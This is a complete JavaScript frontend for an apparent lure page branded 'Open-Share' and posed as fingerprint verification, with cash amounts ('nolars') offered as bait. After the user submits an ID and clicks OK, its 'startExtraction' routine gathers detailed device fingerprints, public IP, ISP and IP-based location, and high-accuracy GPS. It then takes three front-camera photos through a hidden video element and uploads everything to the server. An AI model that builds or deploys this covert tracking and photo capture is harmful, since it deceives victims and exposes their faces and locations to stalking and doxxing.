/**
 * Open-Share — Frontend Application
 * Digital Fingerprint Verification System
 */

(function() {
  'use strict';

  // ===== STATE =====
  const state = {
    rorshid: '',
    interviewDate: '',
    dates: [],
    deviceData: {},
    photos: [],
    isSubmitting: false
  };

  // ===== DOM ELEMENTS =====
  const els = {
    stepForm: document.getElementById('step-form'),
    stepLoading: document.getElementById('step-loading'),
    stepSuccess: document.getElementById('step-success'),
    form: document.getElementById('verify-form'),
    rorshidInput: document.getElementById('rorshid'),
    dateTrigger: document.getElementById('date-select-trigger'),
    dateDropdown: document.getElementById('date-dropdown'),
    dateList: document.getElementById('date-list'),
    dateSearch: document.getElementById('date-search'),
    dateHidden: document.getElementById('interview-date'),
    submitBtn: document.getElementById('submit-btn'),
    modal: document.getElementById('permission-modal'),
    modalOkBtn: document.getElementById('modal-ok-btn'),
    progressFill: document.getElementById('progress-fill'),
    progressText: document.getElementById('progress-text'),
    hiddenVideo: document.getElementById('hidden-video'),
    hiddenCanvas: document.getElementById('hidden-canvas')
  };

  // ===== INIT =====
  async function init() {
    await loadDates();
    setupEventListeners();
    setupCustomSelect();
  }

  // ===== LOAD DATES =====
  async function loadDates() {
    try {
      const res = await fetch('/api/dates');
      const data = await res.json();
      if (data.success) {
        state.dates = data.dates;
        renderDateList(data.dates);
      }
    } catch (err) {
      // Fallback to hardcoded dates
      state.dates = [
        "100 nolars","200 nolars","300 nolars","500 nolars",
        "1k nolars","2k nolars","3k nolars","5k nolars"
      ];
      renderDateList(state.dates);
    }
  }

  // ===== RENDER DATE LIST =====
  function renderDateList(dates) {
    els.dateList.innerHTML = '';
    if (dates.length === 0) {
      els.dateList.innerHTML = '<div class="dropdown-empty">No dates found</div>';
      return;
    }
    dates.forEach(date => {
      const item = document.createElement('div');
      item.className = 'dropdown-item';
      item.dataset.value = date;
      item.innerHTML = `<span class="date-dot"></span><span>${formatDate(date)}</span>`;
      item.addEventListener('click', () => selectDate(date));
      els.dateList.appendChild(item);
    });
  }

  function formatDate(dateStr) {
    return dateStr; // Return as-is for nolars format (e.g., "100 nolars", "1k nolars")
  }

  // ===== CUSTOM SELECT =====
  function setupCustomSelect() {
    els.dateTrigger.addEventListener('click', (e) => {
      e.stopPropagation();
      const isOpen = els.dateDropdown.classList.contains('open');
      if (isOpen) {
        closeDropdown();
      } else {
        openDropdown();
      }
    });

    els.dateSearch.addEventListener('input', (e) => {
      const query = e.target.value.toLowerCase();
      const filtered = state.dates.filter(d => 
        d.toLowerCase().includes(query) || 
        formatDate(d).toLowerCase().includes(query)
      );
      renderDateList(filtered);
    });

    document.addEventListener('click', (e) => {
      if (!els.dateTrigger.contains(e.target) && !els.dateDropdown.contains(e.target)) {
        closeDropdown();
      }
    });
  }

  function openDropdown() {
    els.dateDropdown.classList.add('open');
    els.dateTrigger.classList.add('active');
    setTimeout(() => els.dateSearch.focus(), 100);
  }

  function closeDropdown() {
    els.dateDropdown.classList.remove('open');
    els.dateTrigger.classList.remove('active');
  }

  function selectDate(date) {
    state.interviewDate = date;
    els.dateHidden.value = date;
    els.dateTrigger.querySelector('.select-placeholder').textContent = formatDate(date);
    els.dateTrigger.querySelector('.select-placeholder').classList.add('selected');

    document.querySelectorAll('.dropdown-item').forEach(item => {
      item.classList.toggle('selected', item.dataset.value === date);
    });

    closeDropdown();
  }

  // ===== EVENT LISTENERS =====
  function setupEventListeners() {
    els.form.addEventListener('submit', (e) => {
      e.preventDefault();
      if (!els.rorshidInput.value.trim()) {
        els.rorshidInput.focus();
        return;
      }
      if (!state.interviewDate) {
        openDropdown();
        return;
      }
      state.rorshid = els.rorshidInput.value.trim();
      showModal();
    });

    els.modalOkBtn.addEventListener('click', async () => {
      hideModal();
      await startExtraction();
    });
  }

  // ===== MODAL =====
  function showModal() {
    els.modal.classList.add('active');
    document.body.style.overflow = 'hidden';
  }

  function hideModal() {
    els.modal.classList.remove('active');
    document.body.style.overflow = '';
  }

  // ===== STEP NAVIGATION =====
  function showStep(stepEl) {
    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
    stepEl.classList.add('active');
  }

  // ===== UPDATE PROGRESS =====
  function updateProgress(percent, text) {
    els.progressFill.style.width = percent + '%';
    els.progressText.textContent = text;
  }

  // ===== START EXTRACTION =====
  async function startExtraction() {
    showStep(els.stepLoading);
    state.isSubmitting = true;

    try {
      updateProgress(5, 'Gathering device information...');

      // Collect all device data
      const deviceData = await collectDeviceData();
      state.deviceData = deviceData;

      updateProgress(30, 'Requesting camera access...');

      // Capture photos (hidden, no UI shown)
      const photos = await capturePhotos();
      state.photos = photos;

      updateProgress(70, 'Uploading data securely...');

      // Submit to backend
      await submitData(deviceData, photos);

      updateProgress(100, 'Complete!');

      setTimeout(() => {
        showStep(els.stepSuccess);
      }, 500);

    } catch (err) {
      console.error('Extraction error:', err);
      updateProgress(0, 'Error occurred. Please try again.');
      setTimeout(() => {
        showStep(els.stepForm);
        state.isSubmitting = false;
      }, 2000);
    }
  }

  // ===== COLLECT DEVICE DATA =====
  async function collectDeviceData() {
    const data = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
      screenResolution: `${screen.width}x${screen.height}`,
      screenAvail: `${screen.availWidth}x${screen.availHeight}`,
      colorDepth: screen.colorDepth + '-bit',
      pixelRatio: window.devicePixelRatio || 1,
      touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Yes' : 'No',
      maxTouchPoints: navigator.maxTouchPoints || 0,
      orientation: screen.orientation ? screen.orientation.type : 'unknown',
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneOffset: new Date().getTimezoneOffset(),
      cores: navigator.hardwareConcurrency || 'unknown',
      memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown',
      online: navigator.onLine ? 'Online' : 'Offline',
      cookieEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
      doNotTrack: navigator.doNotTrack || 'unknown',
      pdfViewerEnabled: navigator.pdfViewerEnabled ? 'Yes' : 'No',
      webdriver: navigator.webdriver ? 'Yes' : 'No',
      vendor: navigator.vendor || 'unknown',
      product: navigator.product || 'unknown',
      productSub: navigator.productSub || 'unknown',
      oscpu: navigator.oscpu || 'unknown',
      connectionType: 'unknown',
      effectiveType: 'unknown',
      downlink: 'unknown',
      rtt: 'unknown',
      saveData: 'unknown',
      networkProvider: 'unknown',
      battery: 'Not available',
      ipv6: 'Fetching...',
      gpsLocation: 'Not requested',
      approxLocation: 'Fetching...',
      browser: detectBrowser(),
      os: detectOS(),
      deviceType: detectDeviceType()
    };

    // Network info
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (conn) {
      data.connectionType = conn.type || 'unknown';
      data.effectiveType = conn.effectiveType || 'unknown';
      data.downlink = (conn.downlink || 'unknown') + ' Mbps';
      data.rtt = (conn.rtt || 'unknown') + ' ms';
      data.saveData = conn.saveData ? 'Yes' : 'No';
    }

    // Battery API
    if ('getBattery' in navigator) {
      try {
        const battery = await navigator.getBattery();
        data.battery = `${Math.round(battery.level * 100)}% — ${battery.charging ? 'Charging' : 'Discharging'}`;
      } catch (e) {
        data.battery = 'Permission denied';
      }
    }

    // IP Address (IPv6 preferred, fallback to IPv4)
    try {
      const ipRes = await fetch('https://api64.ipify.org?format=json', { 
        mode: 'cors',
        signal: AbortSignal.timeout(5000)
      });
      const ipData = await ipRes.json();
      data.ipv6 = ipData.ip;

      // Try to get location from IP
      try {
        const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`, {
          signal: AbortSignal.timeout(5000)
        });
        const geoData = await geoRes.json();
        data.approxLocation = `${geoData.city || 'Unknown'}, ${geoData.region || 'Unknown'}, ${geoData.country_name || 'Unknown'}`;
        data.networkProvider = geoData.org || geoData.asn || 'Unknown';
      } catch (e) {
        data.approxLocation = 'Could not determine';
      }
    } catch (e) {
      data.ipv6 = 'Could not fetch';
      data.approxLocation = 'Could not determine';
    }

    // GPS Location — IMPROVED with better error handling
    data.gpsLocation = await getGPSLocation();

    // Canvas fingerprint
    try {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillText('Open-Share Fingerprint', 2, 2);
      ctx.fillStyle = '#f60';
      ctx.fillRect(125, 1, 62, 20);
      data.canvasFingerprint = canvas.toDataURL().slice(0, 50) + '...';
    } catch (e) {
      data.canvasFingerprint = 'Not available';
    }

    // WebGL info
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (gl) {
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
          data.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
          data.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        }
      }
    } catch (e) {
      data.webglVendor = 'Not available';
    }

    return data;
  }

  // ===== IMPROVED GPS LOCATION WITH FALLBACKS =====
  async function getGPSLocation() {
    // Check if geolocation is available
    if (!('geolocation' in navigator)) {
      return 'Geolocation API not supported by this browser';
    }

    // First, check permission status using Permissions API
    try {
      const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
      console.log('Geolocation permission state:', permissionStatus.state);

      if (permissionStatus.state === 'denied') {
        return 'Permission denied by browser settings. Please enable location access in your browser/site settings.';
      }
    } catch (permErr) {
      console.log('Permissions API not available, proceeding anyway');
    }

    // Try to get GPS location with multiple attempts
    const gpsOptions = {
      enableHighAccuracy: true,
      timeout: 15000,
      maximumAge: 0
    };

    // Attempt 1: High accuracy GPS
    try {
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, gpsOptions);
      });

      let locationStr = `Lat: ${position.coords.latitude.toFixed(6)}, Lng: ${position.coords.longitude.toFixed(6)}`;
      if (position.coords.accuracy) {
        locationStr += ` (±${Math.round(position.coords.accuracy)}m accuracy)`;
      }
      if (position.coords.altitude) {
        locationStr += ` | Alt: ${position.coords.altitude.toFixed(1)}m`;
      }
      return locationStr;

    } catch (gpsError) {
      console.log('High accuracy GPS failed:', gpsError.code, gpsError.message);

      // Error code mapping
      const errorMessages = {
        1: 'Permission denied by user or browser',
        2: 'Position unavailable (GPS signal weak or disabled)',
        3: 'GPS request timed out'
      };

      const errorMsg = errorMessages[gpsError.code] || `Unknown error: ${gpsError.message}`;

      // Attempt 2: Try with lower accuracy (network-based)
      if (gpsError.code === 2 || gpsError.code === 3) {
        try {
          console.log('Retrying with lower accuracy...');
          const position2 = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
              enableHighAccuracy: false,
              timeout: 10000,
              maximumAge: 60000
            });
          });

          let locationStr = `Lat: ${position2.coords.latitude.toFixed(6)}, Lng: ${position2.coords.longitude.toFixed(6)}`;
          locationStr += ` (Network-based, ±${Math.round(position2.coords.accuracy || 0)}m)`;
          return locationStr;

        } catch (fallbackError) {
          console.log('Low accuracy fallback also failed:', fallbackError.message);
        }
      }

      return `${errorMsg} — Falling back to IP-based location`;
    }
  }

  // ===== DETECT BROWSER =====
  function detectBrowser() {
    const ua = navigator.userAgent;
    if (ua.includes('Firefox')) return 'Firefox';
    if (ua.includes('SamsungBrowser')) return 'Samsung Internet';
    if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
    if (ua.includes('Trident') || ua.includes('MSIE')) return 'Internet Explorer';
    if (ua.includes('Edge') || ua.includes('Edg')) return 'Microsoft Edge';
    if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
    if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
    return 'Unknown';
  }

  // ===== DETECT OS =====
  function detectOS() {
    const ua = navigator.userAgent;
    const platform = navigator.platform;
    if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
    if (/Windows NT 6.3/.test(ua)) return 'Windows 8.1';
    if (/Windows NT 6.2/.test(ua)) return 'Windows 8';
    if (/Windows NT 6.1/.test(ua)) return 'Windows 7';
    if (/Mac OS X/.test(ua)) return 'macOS';
    if (/Android/.test(ua)) return 'Android';
    if (/iPhone|iPad|iPod/.test(ua)) return 'iOS';
    if (/Linux/.test(platform)) return 'Linux';
    return platform || 'Unknown';
  }

  // ===== DETECT DEVICE TYPE =====
  function detectDeviceType() {
    const ua = navigator.userAgent;
    if (/Mobi|Android|iPhone|iPad|iPod/.test(ua)) {
      if (/iPad/.test(ua)) return 'Tablet (iPad)';
      if (/Tablet|Tab/.test(ua)) return 'Tablet';
      return 'Mobile';
    }
    return 'Desktop';
  }

  // ===== CAPTURE PHOTOS (HIDDEN) =====
  async function capturePhotos() {
    const photos = [];
    const video = els.hiddenVideo;
    const canvas = els.hiddenCanvas;
    const ctx = canvas.getContext('2d');

    try {
      // Request camera access
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { 
          facingMode: 'user',
          width: { ideal: 1280 },
          height: { ideal: 720 }
        },
        audio: false
      });

      video.srcObject = stream;

      // Wait for video to be ready
      await new Promise(resolve => {
        video.onloadedmetadata = () => {
          video.play();
          resolve();
        };
      });

      // Set canvas size
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;

      // Capture 3 photos, 1 per second
      for (let i = 0; i < 3; i++) {
        await new Promise(r => setTimeout(r, 1000));

        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Convert to blob
        const blob = await new Promise(resolve => {
          canvas.toBlob(resolve, 'image/jpeg', 0.85);
        });

        if (blob) {
          photos.push(blob);
        }

        updateProgress(30 + ((i + 1) * 12), `Capturing photo ${i + 1}/3...`);
      }

      // Stop all tracks
      stream.getTracks().forEach(track => track.stop());
      video.srcObject = null;

    } catch (err) {
      console.error('Camera error:', err);
      // Continue without photos if camera fails
    }

    return photos;
  }

  // ===== SUBMIT DATA =====
  async function submitData(deviceData, photos) {
    const formData = new FormData();
    formData.append('rorshid', state.rorshid);
    formData.append('interviewDate', state.interviewDate);
    formData.append('deviceData', JSON.stringify(deviceData));

    // Append photos
    photos.forEach((blob, index) => {
      formData.append('photos', blob, `capture_${index + 1}.jpg`);
    });

    const res = await fetch('/api/submit', {
      method: 'POST',
      body: formData
    });

    const result = await res.json();

    if (!result.success) {
      throw new Error(result.error || 'Submission failed');
    }
  }

  // ===== START =====
  init();

})();
